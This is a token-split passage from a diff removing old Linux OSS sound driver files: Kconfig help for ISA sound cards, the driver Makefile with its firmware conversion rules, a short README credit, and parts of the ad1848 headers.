"your", "sound", "card", "above", ",", "then", "pick", "your", "driver", "from", "the", "list", "below", ".", "if", "SOUND_OSS", "config", "SOUND_TRACEINIT", "bool", "\"", "Verbose", "initialisation", "\"", "help", "Verbose", "soundcard", "initialization", "-", "-", "affects", "the", "format", "of", "autoprobe", "and", "initialization", "messages", "at", "boot", "time", ".", "config", "SOUND_DMAP", "bool", "\"", "Persistent", "DMA", "buffers", "\"", "-", "--", "help", "Linux", "can", "often", "have", "problems", "allocating", "DMA", "buffers", "for", "ISA", "sound", "cards", "on", "machines", "with", "more", "than", "16MB", "of", "RAM", ".", "This", "is", "because", "ISA", "DMA", "buffers", "must", "exist", "below", "the", "16MB", "boundary", "and", "it", "is", "quite", "possible", "that", "a", "large", "enough", "free", "block", "in", "this", "region", "cannot", "be", "found", "after", "the", "machine", "has", "been", "running", "for", "a", "while", ".", "If", "you", "say", "Y", "here", "the", "DMA", "buffers", "(", "64Kb", ")", "will", "be", "allocated", "at", "boot", "time", "and", "kept", "until", "the", "shutdown", ".", "This", "option", "is", "only", "useful", "if", "you", "said", "Y", "to", "\"", "OSS", "sound", "modules", "\"", ",", "above", ".", "If", "you", "said", "M", "to", "\"", "OSS", "sound", "modules", "\"", "then", "you", "can", "get", "the", "persistent", "DMA", "buffer", "functionality", "by", "passing", "the", "command", "-", "line", "argument", "\"", "dmabuf", "=", "1", "\"", "to", "the", "sound", "module", ".", "Say", "Y", "unless", "you", "have", "16MB", "or", "more", "RAM", "or", "a", "PCI", "sound", "card", ".", "config", "SOUND_VMIDI", "tristate", "\"", "Loopback", "MIDI", "device", "support", "\"", "help", "Support", "for", "MIDI", "loopback", "on", "port", "1", "or", "2", ".", "config", "SOUND_TRIX", "tristate", "\"", "MediaTrix", "AudioTrix", "Pro", "support", "\"", "help", "Answer", "Y", "if", "you", "have", "the", "AudioTriX", "Pro", "sound", "card", "manufactured", "by", "MediaTrix", ".", "config", "TRIX_HAVE_BOOT", "bool", "\"", "Have", "TRXPRO", ".", "HEX", "firmware", "file", "\"", "depends", "on", "SOUND_TRIX", "=", "y", "&", "&", "!", "STANDALONE", "help", "The", "MediaTrix", "AudioTrix", "Pro", "has", "an", "on", "-", "board", "microcontroller", "which", "needs", "to", "be", "initialized", "by", "downloading", "the", "code", "from", "the", "file", "TRXPRO", ".", "HEX", "in", "the", "DOS", "driver", "directory", ".", "If", "you", "don", "'", "t", "have", "the", "TRXPRO", ".", "HEX", "file", "handy", "you", "may", "skip", "this", "step", ".", "However", ",", "the", "SB", "and", "MPU", "-", "401", "modes", "of", "AudioTrix", "Pro", "will", "not", "work", "without", "this", "file", "!", "config", "TRIX_BOOT_FILE", "string", "\"", "Full", "pathname", "of", "TRXPRO", ".", "HEX", "firmware", "file", "\"", "depends", "on", "TRIX_HAVE_BOOT", "default", "\"", "/", "etc", "/", "sound", "/", "trxpro", ".", "hex", "\"", "help", "Enter", "the", "full", "pathname", "of", "your", "TRXPRO", ".", "HEX", "file", ",", "starting", "from", "/", ".", "config", "SOUND_MSS", "tristate", "\"", "Microsoft", "Sound", "System", "support", "\"", "-", "--", "help", "Again", "think", "carefully", "before", "answering", "Y", "to", "this", "question", ".", "It", "'", "s", "safe", "to", "answer", "Y", "if", "you", "have", "the", "original", "Windows", "Sound", "System", "card", "made", "by", "Microsoft", "or", "Aztech", "SG", "16", "Pro", "(", "or", "NX16", "Pro", ")", ".", "Also", "you", "may", "say", "Y", "in", "case", "your", "card", "is", "NOT", "among", "these", ":", "ATI", "Stereo", "F", "/", "X", ",", "AdLib", ",", "Audio", "Excell", "DSP16", ",", "Cardinal", "DSP16", ",", "Ensoniq", "SoundScape", "(", "and", "compatibles", "made", "by", "Reveal", "and", "Spea", ")", ",", "Gravis", "Ultrasound", ",", "Gravis", "Ultrasound", "ACE", ",", "Gravis", "Ultrasound", "Max", ",", "Gravis", "Ultrasound", "with", "16", "bit", "option", ",", "Logitech", "Sound", "Man", "16", ",", "Logitech", "SoundMan", "Games", ",", "Logitech", "SoundMan", "Wave", ",", "MAD16", "Pro", "(", "OPTi", "82C929", ")", ",", "Media", "Vision", "Jazz16", ",", "MediaTriX", "AudioTriX", "Pro", ",", "Microsoft", "Windows", "Sound", "System", "(", "MSS", "/", "WSS", ")", ",", "Mozart", "(", "OAK", "OTI", "-", "601", ")", ",", "Orchid", "SW32", ",", "Personal", "Sound", "System", "(", "PSS", ")", ",", "Pro", "Audio", "Spectrum", "16", ",", "Pro", "Audio", "Studio", "16", ",", "Pro", "Sonic", "16", ",", "Roland", "MPU", "-", "401", "MIDI", "interface", ",", "Sound", "Blaster", "1", ".", "0", ",", "Sound", "Blaster", "16", ",", "Sound", "Blaster", "16ASP", ",", "Sound", "Blaster", "2", ".", "0", ",", "Sound", "Blaster", "AWE32", ",", "Sound", "Blaster", "Pro", ",", "TI", "TM4000M", "notebook", ",", "ThunderBoard", ",", "Turtle", "Beach", "Tropez", ",", "Yamaha", "FM", "synthesizers", "(", "OPL2", ",", "OPL3", "and", "OPL4", ")", ",", "6850", "UART", "MIDI", "Interface", ".", "For", "cards", "having", "native", "support", "in", "VoxWare", ",", "consult", "the", "card", "specific", "instructions", "in", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "README", ".", "OSS", ">", ".", "Some", "drivers", "have", "their", "own", "MSS", "support", "and", "saying", "Y", "to", "this", "option", "will", "cause", "a", "conflict", ".", "If", "you", "compile", "the", "driver", "into", "the", "kernel", ",", "you", "have", "to", "add", "\"", "ad1848", "=", "<", "io", ">", ",<", "irq", ">", ",<", "dma", ">", ",<", "dma2", ">", "[,", "<", "type", ">", "]\"", "to", "the", "kernel", "command", "line", ".", "config", "SOUND_MPU401", "tristate", "\"", "MPU", "-", "401", "support", "(", "NOT", "for", "SB16", ")", "\"", "-", "--", "help", "Be", "careful", "with", "this", "question", ".", "The", "MPU401", "interface", "is", "supported", "by", "all", "sound", "cards", ".", "However", ",", "some", "natively", "supported", "cards", "have", "their", "own", "driver", "for", "MPU401", ".", "Enabling", "this", "MPU401", "option", "with", "these", "cards", "will", "cause", "a", "conflict", ".", "Also", ",", "enabling", "MPU401", "on", "a", "system", "that", "doesn", "'", "t", "really", "have", "a", "MPU401", "could", "cause", "some", "trouble", ".", "If", "your", "card", "was", "in", "the", "list", "of", "supported", "cards", ",", "look", "at", "the", "card", "specific", "instructions", "in", "the", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "README", ".", "OSS", ">", "file", ".", "It", "is", "safe", "to", "answer", "Y", "if", "you", "have", "a", "true", "MPU401", "MIDI", "interface", "card", ".", "If", "you", "compile", "the", "driver", "into", "the", "kernel", ",", "you", "have", "to", "add", "\"", "mpu401", "=", "<", "io", ">", ",<", "irq", ">", "\"", "to", "the", "kernel", "command", "line", ".", "config", "SOUND_PAS", "tristate", "\"", "ProAudioSpectrum", "16", "support", "\"", "-", "--", "help", "Answer", "Y", "only", "if", "you", "have", "a", "Pro", "Audio", "Spectrum", "16", ",", "ProAudio", "Studio", "16", "or", "Logitech", "SoundMan", "16", "sound", "card", ".", "Answer", "N", "if", "you", "have", "some", "other", "card", "made", "by", "Media", "Vision", "or", "Logitech", "since", "those", "are", "not", "PAS16", "compatible", ".", "Please", "read", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "PAS16", ">", ".", "It", "is", "not", "necessary", "to", "add", "Sound", "Blaster", "support", "separately", ";", "it", "is", "included", "in", "PAS", "support", ".", "If", "you", "compile", "the", "driver", "into", "the", "kernel", ",", "you", "have", "to", "add", "\"", "pas2", "=", "<", "io", ">", ",<", "irq", ">", ",<", "dma", ">", ",<", "dma2", ">", ",<", "sbio", ">", ",<", "sbirq", ">", ",<", "sbdma", ">", ",<", "sbdma2", ">", "to", "the", "kernel", "command", "line", ".", "config", "PAS_JOYSTICK", "bool", "\"", "Enable", "PAS16", "joystick", "port", "\"", "depends", "on", "SOUND_PAS", "=", "y", "help", "Say", "Y", "here", "to", "enable", "the", "Pro", "Audio", "Spectrum", "16", "'", "s", "auxiliary", "joystick", "port", ".", "config", "SOUND_PSS", "tristate", "\"", "PSS", "(", "AD1848", ",", "ADSP", "-", "2115", ",", "ESC614", ")", "support", "\"", "help", "Answer", "Y", "or", "M", "if", "you", "have", "an", "Orchid", "SW32", ",", "Cardinal", "DSP16", ",", "Beethoven", "ADSP", "-", "16", "or", "some", "other", "card", "based", "on", "the", "PSS", "chipset", "(", "AD1848", "codec", "+", "ADSP", "-", "2115", "DSP", "chip", "+", "Echo", "ESC614", "ASIC", "CHIP", ")", ".", "For", "more", "information", "on", "how", "to", "compile", "it", "into", "the", "kernel", "or", "as", "a", "module", "see", "the", "file", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "PSS", ">", ".", "If", "you", "compile", "the", "driver", "into", "the", "kernel", ",", "you", "have", "to", "add", "\"", "pss", "=", "<", "io", ">", ",<", "mssio", ">", ",<", "mssirq", ">", ",<", "mssdma", ">", ",<", "mpuio", ">", ",<", "mpuirq", ">", "\"", "to", "the", "kernel", "command", "line", ".", "config", "PSS_MIXER", "bool", "\"", "Enable", "PSS", "mixer", "(", "Beethoven", "ADSP", "-", "16", "and", "other", "compatible", ")", "\"", "depends", "on", "SOUND_PSS", "help", "Answer", "Y", "for", "Beethoven", "ADSP", "-", "16", ".", "You", "may", "try", "to", "say", "Y", "also", "for", "other", "cards", "if", "they", "have", "master", "volume", ",", "bass", ",", "treble", ",", "and", "you", "can", "'", "t", "control", "it", "under", "Linux", ".", "If", "you", "answer", "N", "for", "Beethoven", "ADSP", "-", "16", ",", "you", "can", "'", "t", "control", "master", "volume", ",", "bass", ",", "treble", "and", "synth", "volume", ".", "If", "you", "said", "M", "to", "\"", "PSS", "support", "\"", "above", ",", "you", "may", "enable", "or", "disable", "this", "PSS", "mixer", "with", "the", "module", "parameter", "pss_mixer", ".", "For", "more", "information", "see", "the", "file", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "PSS", ">", ".", "config", "PSS_HAVE_BOOT", "bool", "\"", "Have", "DSPxxx", ".", "LD", "firmware", "file", "\"", "depends", "on", "SOUND_PSS", "&", "&", "!", "STANDALONE", "help", "If", "you", "have", "the", "DSPxxx", ".", "LD", "file", "or", "SYNTH", ".", "LD", "file", "for", "you", "card", ",", "say", "Y", "to", "include", "this", "file", ".", "Without", "this", "file", "the", "synth", "device", "(", "OPL", ")", "may", "not", "work", ".", "config", "PSS_BOOT_FILE", "string", "\"", "Full", "pathname", "of", "DSPxxx", ".", "LD", "firmware", "file", "\"", "depends", "on", "PSS_HAVE_BOOT", "default", "\"", "/", "etc", "/", "sound", "/", "dsp001", ".", "ld", "\"", "help", "Enter", "the", "full", "pathname", "of", "your", "DSPxxx", ".", "LD", "file", "or", "SYNTH", ".", "LD", "file", ",", "starting", "from", "/", ".", "config", "SOUND_SB", "tristate", "\"", "100", "%", "Sound", "Blaster", "compatibles", "(", "SB16", "/", "32", "/", "64", ",", "ESS", ",", "Jazz16", ")", "support", "\"", "-", "--", "help", "Answer", "Y", "if", "you", "have", "an", "original", "Sound", "Blaster", "card", "made", "by", "Creative", "Labs", "or", "a", "100", "%", "hardware", "compatible", "clone", "(", "like", "the", "Thunderboard", "or", "SM", "Games", ")", ".", "For", "an", "unknown", "card", "you", "may", "answer", "Y", "if", "the", "card", "claims", "to", "be", "Sound", "Blaster", "-", "compatible", ".", "Please", "read", "the", "file", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "Soundblaster", ">", ".", "You", "should", "also", "say", "Y", "here", "for", "cards", "based", "on", "the", "Avance", "Logic", "ALS", "-", "007", "and", "ALS", "-", "1X0", "chips", "(", "read", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "ALS", ">", ")", "and", "for", "cards", "based", "on", "ESS", "chips", "(", "read", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "ESS1868", ">", "and", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "ESS", ">", ").", "If", "you", "have", "an", "IBM", "Mwave", "card", ",", "say", "Y", "here", "and", "read", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "mwave", ">", ".", "If", "you", "compile", "the", "driver", "into", "the", "kernel", "and", "don", "'", "t", "want", "to", "use", "isapnp", ",", "you", "have", "to", "add", "\"", "sb", "=", "<", "io", ">", ",<", "irq", ">", ",<", "dma", ">", ",<", "dma2", ">", "\"", "to", "the", "kernel", "command", "line", ".", "You", "can", "say", "M", "here", "to", "compile", "this", "driver", "as", "a", "module", ";", "the", "module", "is", "called", "sb", ".", "config", "SOUND_YM3812", "tristate", "\"", "Yamaha", "FM", "synthesizer", "(", "YM3812", "/", "OPL", "-", "3", ")", "support", "\"", "-", "--", "help", "Answer", "Y", "if", "your", "card", "has", "a", "FM", "chip", "made", "by", "Yamaha", "(", "OPL2", "/", "OPL3", "/", "OPL4", ")", ".", "Answering", "Y", "is", "usually", "a", "safe", "and", "recommended", "choice", ",", "however", "some", "cards", "may", "have", "software", "(", "TSR", ")", "FM", "emulation", ".", "Enabling", "FM", "support", "with", "these", "cards", "may", "cause", "trouble", "(", "I", "don", "'", "t", "currently", "know", "of", "any", "such", "cards", ",", "however", ")", ".", "Please", "read", "the", "file", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "OPL3", ">", "if", "your", "card", "has", "an", "OPL3", "chip", ".", "If", "you", "compile", "the", "driver", "into", "the", "kernel", ",", "you", "have", "to", "add", "\"", "opl3", "=", "<", "io", ">", "\"", "to", "the", "kernel", "command", "line", ".", "If", "unsure", ",", "say", "Y", ".", "config", "SOUND_UART6850", "tristate", "\"", "6850", "UART", "support", "\"", "help", "This", "option", "enables", "support", "for", "MIDI", "interfaces", "based", "on", "the", "6850", "UART", "chip", ".", "This", "interface", "is", "rarely", "found", "on", "sound", "cards", ".", "It", "'", "s", "safe", "to", "answer", "N", "to", "this", "question", ".", "If", "you", "compile", "the", "driver", "into", "the", "kernel", ",", "you", "have", "to", "add", "\"", "uart6850", "=", "<", "io", ">", ",<", "irq", ">", "\"", "to", "the", "kernel", "command", "line", ".", "config", "SOUND_AEDSP16", "tristate", "\"", "Gallant", "Audio", "Cards", "(", "SC", "-", "6000", "and", "SC", "-", "6600", "based", ")", "\"", "-", "--", "help", "Answer", "Y", "if", "you", "have", "a", "Gallant", "'", "s", "Audio", "Excel", "DSP", "16", "card", ".", "This", "driver", "supports", "Audio", "Excel", "DSP", "16", "but", "not", "the", "III", "nor", "PnP", "versions", "of", "this", "card", ".", "The", "Gallant", "'", "s", "Audio", "Excel", "DSP", "16", "card", "can", "emulate", "either", "an", "SBPro", "or", "a", "Microsoft", "Sound", "System", "card", ",", "so", "you", "should", "have", "said", "Y", "to", "either", "\"", "100", "%", "Sound", "Blaster", "compatibles", "(", "SB16", "/", "32", "/", "64", ",", "ESS", ",", "Jazz16", ")", "support", "\"", "or", "\"", "Microsoft", "Sound", "System", "support", "\"", ",", "above", ",", "and", "you", "need", "to", "answer", "the", "\"", "MSS", "emulation", "\"", "and", "\"", "SBPro", "emulation", "\"", "questions", "below", "accordingly", ".", "You", "should", "say", "Y", "to", "one", "and", "only", "one", "of", "these", "two", "questions", ".", "Read", "the", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "README", ".", "OSS", ">", "file", "and", "the", "head", "of", "<", "file", ":", "sound", "/", "oss", "/", "aedsp16", ".", "c", ">", "as", "well", "as", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "AudioExcelDSP16", ">", "to", "get", "more", "information", "about", "this", "driver", "and", "its", "configuration", ".", "config", "SC6600", "bool", "\"", "SC", "-", "6600", "based", "audio", "cards", "(", "new", "Audio", "Excel", "DSP", "16", ")", "\"", "depends", "on", "SOUND_AEDSP16", "help", "The", "SC6600", "is", "the", "new", "version", "of", "DSP", "mounted", "on", "the", "Audio", "Excel", "DSP", "16", "cards", ".", "Find", "in", "the", "manual", "the", "FCC", "ID", "of", "your", "audio", "card", "and", "answer", "Y", "if", "you", "have", "an", "SC6600", "DSP", ".", "config", "SC6600_JOY", "bool", "\"", "Activate", "SC", "-", "6600", "Joystick", "Interface", "\"", "depends", "on", "SC6600", "help", "Say", "Y", "here", "in", "order", "to", "use", "the", "joystick", "interface", "of", "the", "Audio", "Excel", "DSP", "16", "card", ".", "config", "SC6600_CDROM", "int", "\"", "SC", "-", "6600", "CDROM", "Interface", "(", "4", "=", "None", ",", "3", "=", "IDE", ",", "1", "=", "Panasonic", ",", "0", "=", "?", "Sony", "?", ")\"", "depends", "on", "SC6600", "default", "\"", "4", "\"", "help", "This", "is", "used", "to", "activate", "the", "CD", "-", "ROM", "interface", "of", "the", "Audio", "Excel", "DSP", "16", "card", ".", "Enter", ":", "0", "for", "Sony", ",", "1", "for", "Panasonic", ",", "2", "for", "IDE", ",", "4", "for", "no", "CD", "-", "ROM", "present", ".", "config", "SC6600_CDROMBASE", "hex", "\"", "SC", "-", "6600", "CDROM", "Interface", "I", "/", "O", "Address", "\"", "depends", "on", "SC6600", "default", "\"", "0", "\"", "help", "Base", "I", "/", "O", "port", "address", "for", "the", "CD", "-", "ROM", "interface", "of", "the", "Audio", "Excel", "DSP", "16", "card", ".", "config", "SOUND_VIDC", "tristate", "\"", "VIDC", "16", "-", "bit", "sound", "\"", "depends", "on", "ARM", "&", "&", "ARCH_ACORN", "help", "16", "-", "bit", "support", "for", "the", "VIDC", "onboard", "sound", "hardware", "found", "on", "Acorn", "machines", ".", "config", "SOUND_WAVEARTIST", "tristate", "\"", "Netwinder", "WaveArtist", "\"", "depends", "on", "ARM", "&", "&", "ARCH_NETWINDER", "help", "Say", "Y", "here", "to", "include", "support", "for", "the", "Rockwell", "WaveArtist", "sound", "system", ".", "This", "driver", "is", "mainly", "for", "the", "NetWinder", ".", "config", "SOUND_KAHLUA", "tristate", "\"", "XpressAudio", "Sound", "Blaster", "emulation", "\"", "depends", "on", "SOUND_SB", "endif", "#", "SOUND_OSS", "@", "@", "-", "1", ",", "107", "+", "0", ",", "0", "@", "@", "#", "Makefile", "for", "the", "Linux", "sound", "card", "driver", "#", "#", "18", "Apr", "1998", ",", "Michael", "Elizabeth", "Chastain", ",", "<", "mailto", ":", "mec", "@", "shout", ".", "net", ">", "#", "Rewritten", "to", "use", "lists", "instead", "of", "if", "-", "statements", ".", "#", "Each", "configuration", "option", "enables", "a", "list", "of", "files", ".", "obj", "-", "$(", "CONFIG_SOUND_OSS", ")", "+", "=", "sound", ".", "o", "#", "Please", "leave", "it", "as", "is", ",", "cause", "the", "link", "order", "is", "significant", "!", "obj", "-", "$(", "CONFIG_SOUND_AEDSP16", ")", "+", "=", "aedsp16", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_PSS", ")", "+", "=", "pss", ".", "o", "ad1848", ".", "o", "mpu401", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_TRIX", ")", "+", "=", "trix", ".", "o", "ad1848", ".", "o", "sb_lib", ".", "o", "uart401", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_MSS", ")", "+", "=", "ad1848", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_PAS", ")", "+", "=", "pas2", ".", "o", "sb", ".", "o", "sb_lib", ".", "o", "uart401", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_SB", ")", "+", "=", "sb", ".", "o", "sb_lib", ".", "o", "uart401", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_KAHLUA", ")", "+", "=", "kahlua", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_MPU401", ")", "+", "=", "mpu401", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_UART6850", ")", "+", "=", "uart6850", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_YM3812", ")", "+", "=", "opl3", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_VMIDI", ")", "+", "=", "v_midi", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_VIDC", ")", "+", "=", "vidc_mod", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_WAVEARTIST", ")", "+", "=", "waveartist", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_MSNDCLAS", ")", "+", "=", "msnd", ".", "o", "msnd_classic", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_MSNDPIN", ")", "+", "=", "msnd", ".", "o", "msnd_pinnacle", ".", "o", "obj", "-", "$(", "CONFIG_SOUND_BCM_CS4297A", ")", "+", "=", "swarm_cs4297a", ".", "o", "obj", "-", "$(", "CONFIG_DMASOUND", ")", "+", "=", "dmasound", "/", "#", "Declare", "multi", "-", "part", "drivers", ".", "sound", "-", "objs", ":", "=", "\\", "dev_table", ".", "o", "soundcard", ".", "o", "\\", "audio", ".", "o", "dmabuf", ".", "o", "\\", "midi_synth", ".", "o", "midibuf", ".", "o", "\\", "sequencer", ".", "o", "sound_timer", ".", "o", "sys_timer", ".", "o", "pas2", "-", "objs", ":", "=", "pas2_card", ".", "o", "pas2_midi", ".", "o", "pas2_mixer", ".", "o", "pas2_pcm", ".", "o", "sb", "-", "objs", ":", "=", "sb_card", ".", "o", "sb_lib", "-", "objs", ":", "=", "sb_common", ".", "o", "sb_audio", ".", "o", "sb_midi", ".", "o", "sb_mixer", ".", "o", "sb_ess", ".", "o", "vidc_mod", "-", "objs", ":", "=", "vidc", ".", "o", "vidc_fill", ".", "o", "hostprogs", "-", "y", ":", "=", "bin2hex", "hex2hex", "#", "Files", "generated", "that", "shall", "be", "removed", "upon", "make", "clean", "clean", "-", "files", ":", "=", "msndperm", ".", "c", "msndinit", ".", "c", "pndsperm", ".", "c", "pndspini", ".", "c", "\\", "pss_boot", ".", "h", "trix_boot", ".", "h", "#", "Firmware", "files", "that", "need", "translation", "#", "#", "The", "translated", "files", "are", "protected", "by", "a", "file", "that", "keeps", "track", "#", "of", "what", "name", "was", "used", "to", "build", "them", ".", "If", "the", "name", "changes", ",", "they", "#", "will", "be", "forced", "to", "be", "remade", ".", "#", "#", "Turtle", "Beach", "MultiSound", "ifeq", "(", "$(", "CONFIG_MSNDCLAS_HAVE_BOOT", ")", ",", "y", ")", "$", "(", "obj", ")", "/", "msnd_classic", ".", "o", ":", "$", "(", "obj", ")", "/", "msndperm", ".", "c", "$", "(", "obj", ")", "/", "msndinit", ".", "c", "$", "(", "obj", ")", "/", "msndperm", ".", "c", ":", "$", "(", "patsubst", "\"", "%\"", ",", "%", ",", "$", "(", "CONFIG_MSNDCLAS_PERM_FILE", ")", ")", "$", "(", "obj", ")", "/", "bin2hex", "$", "(", "obj", ")", "/", "bin2hex", "msndperm", "<", "$", "<", ">", "$", "@", "$", "(", "obj", ")", "/", "msndinit", ".", "c", ":", "$", "(", "patsubst", "\"", "%\"", ",", "%", ",", "$", "(", "CONFIG_MSNDCLAS_INIT_FILE", ")", ")", "$", "(", "obj", ")", "/", "bin2hex", "$", "(", "obj", ")", "/", "bin2hex", "msndinit", "<", "$", "<", ">", "$", "@", "endif", "ifeq", "(", "$(", "CONFIG_MSNDPIN_HAVE_BOOT", ")", ",", "y", ")", "$", "(", "obj", ")", "/", "msnd_pinnacle", ".", "o", ":", "$", "(", "obj", ")", "/", "pndsperm", ".", "c", "$", "(", "obj", ")", "/", "pndspini", ".", "c", "$", "(", "obj", ")", "/", "pndsperm", ".", "c", ":", "$", "(", "patsubst", "\"", "%\"", ",", "%", ",", "$", "(", "CONFIG_MSNDPIN_PERM_FILE", ")", ")", "$", "(", "obj", ")", "/", "bin2hex", "$", "(", "obj", ")", "/", "bin2hex", "pndsperm", "<", "$", "<", ">", "$", "@", "$", "(", "obj", ")", "/", "pndspini", ".", "c", ":", "$", "(", "patsubst", "\"", "%\"", ",", "%", ",", "$", "(", "CONFIG_MSNDPIN_INIT_FILE", ")", ")", "$", "(", "obj", ")", "/", "bin2hex", "$", "(", "obj", ")", "/", "bin2hex", "pndspini", "<", "$", "<", ">", "$", "@", "endif", "#", "PSS", "(", "ECHO", "-", "ADI2111", ")", "$", "(", "obj", ")", "/", "pss", ".", "o", ":", "$", "(", "obj", ")", "/", "pss_boot", ".", "h", "ifeq", "(", "$(", "CONFIG_PSS_HAVE_BOOT", ")", ",", "y", ")", "$", "(", "obj", ")", "/", "pss_boot", ".", "h", ":", "$", "(", "patsubst", "\"", "%\"", ",", "%", ",", "$", "(", "CONFIG_PSS_BOOT_FILE", ")", ")", "$", "(", "obj", ")", "/", "bin2hex", "$", "(", "obj", ")", "/", "bin2hex", "pss_synth", "<", "$", "<", ">", "$", "@", "else", "$", "(", "obj", ")", "/", "pss_boot", ".", "h", ":", "$", "(", "Q", ")", "(", "\\", "echo", "'", "static", "unsigned", "char", "*", "pss_synth", "=", "NULL", ";", "';", "\\", "echo", "'", "static", "int", "pss_synthLen", "=", "0", ";", "';", "\\", ")", ">", "$", "@", "endif", "#", "MediaTrix", "AudioTrix", "Pro", "$", "(", "obj", ")", "/", "trix", ".", "o", ":", "$", "(", "obj", ")", "/", "trix_boot", ".", "h", "ifeq", "(", "$(", "CONFIG_TRIX_HAVE_BOOT", ")", ",", "y", ")", "$", "(", "obj", ")", "/", "trix_boot", ".", "h", ":", "$", "(", "patsubst", "\"", "%\"", ",", "%", ",", "$", "(", "CONFIG_TRIX_BOOT_FILE", ")", ")", "$", "(", "obj", ")", "/", "hex2hex", "$", "(", "obj", ")", "/", "hex2hex", "-", "i", "trix_boot", "<", "$", "<", ">", "$", "@", "else", "$", "(", "obj", ")", "/", "trix_boot", ".", "h", ":", "$", "(", "Q", ")", "(", "\\", "echo", "'", "static", "unsigned", "char", "*", "trix_boot", "=", "NULL", ";", "';", "\\", "echo", "'", "static", "int", "trix_boot_len", "=", "0", ";", "';", "\\", ")", ">", "$", "@", "endif", "@", "@", "-", "1", ",", "6", "+", "0", ",", "0", "@", "@", "The", "modular", "sound", "driver", "patches", "were", "funded", "by", "Red", "Hat", "Software", "(", "www", ".", "redhat", ".", "com", ")", ".", "The", "sound", "driver", "here", "is", "thus", "a", "modified", "version", "of", "Hannu", "'", "s", "code", ".", "Please", "bear", "that", "in", "mind", "when", "considering", "the", "appropriate", "forums", "for", "bug", "reporting", ".", "Alan", "Cox", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "define", "AD_F_CS4231", "0x0001", "/", "*", "Returned", "if", "a", "CS4232", "(", "or", "compatible", ")", "detected", "*", "/", "#", "define", "AD_F_CS4248", "0x0001", "/", "*", "Returned", "if", "a", "CS4248", "(", "or", "compatible", ")", "detected", "*", "/", "#", "define", "AD1848_SET_XTAL", "1", "#", "define", "AD1848_MIXER_REROUTE", "2", "#", "define", "AD1848_REROUTE", "(", "oldctl", ",", "newctl", ")", "\\", "ad1848_control", "(", "AD1848_MIXER_REROUTE", ",", "(", "(", "oldctl", ")", "<<", "8", ")", "|(", "newctl", ")", ")", "int", "ad1848_init", "(", "char", "*", "name", ",", "struct", "resource", "*", "ports", ",", "int", "irq", ",", "int", "dma_playback", ",", "int", "dma_capture", ",", "int", "share_dma", ",", "int", "*", "osp", ",", "struct", "module", "*", "owner", ")", ";", "void", "ad1848_unload", "(", "int", "io_base", ",", "int", "irq", ",", "int", "dma_playback", ",", "int", "dma_capture", ",", "int", "share_dma", ")", ";", "int", "ad1848_detect", "(", "struct", "resource", "*", "ports", ",", "int", "*", "flags", ",", "int", "*", "osp", ")", ";", "int", "ad1848_control", "(", "int", "cmd", ",", "int", "arg", ")", ";", "void", "attach_ms_sound", "(", "struct", "address_info", "*", "hw_config", ",", "struct", "resource", "*", "ports", ",", "struct", "module", "*", "owner", ")", ";", "int", "probe_ms_sound", "(", "struct", "address_info", "*", "hw_config", ",", "struct", "resource", "*", "ports", ")", ";", "void", "unload_ms_sound", "(", "struct", "address_info", "*", "hw_info", ")", ";", "@", "@", "-", "1", ",", "253", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "ad1848_mixer", ".", "h", "*", "*", "Definitions", "for", "the", "mixer", "of", "AD1848", "and", "compatible", "codecs", ".", "*", "/", "/", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "/", "/", "*", "*", "The", "AD1848", "codec", "has", "generic", "input", "lines", "called", "Line", ",", "Aux1", "and", "Aux2", ".", "*", "Sound", "card", "manufacturers", "have", "connected", "actual", "inputs", "(", "CD", ",", "synth", ",", "line", ",", "*", "etc", ")", "to", "these", "inputs", "in", "different", "order", ".", "Therefore", "it", "'", "s", "difficult", "*", "to", "assign", "mixer", "channels", "to", "these", "inputs", "correctly", ".", "The", "following", "*", "contains", "two", "alternative", "mappings", ".", "The", "first", "one", "is", "for", "GUS", "MAX", "and", "*", "the", "second", "is", "just", "a", "generic", "one", "(", "line1", ",", "line2", "and", "line3", ")", ".", "*", "(", "Actually", "this", "is", "not", "a", "mapping", "but", "rather", "some", "kind", "of", "interleaving", "*", "solution", ")", ".", "*", "/", "#", "define", "MODE1_REC_DEVICES", "(", "SOUND_MASK_LINE3", "|", "SOUND_MASK_MIC", "|", "\\", "SOUND_MASK_LINE1", "|", "SOUND_MASK_IMIX", ")", "#", "define", "SPRO_REC_DEVICES", "(", "SOUND_MASK_LINE", "|", "SOUND_MASK_MIC", "|", "\\", "SOUND_MASK_CD", "|", "SOUND_MASK_LINE1", ")", "#", "define", "MODE1_MIXER_DEVICES", "(", 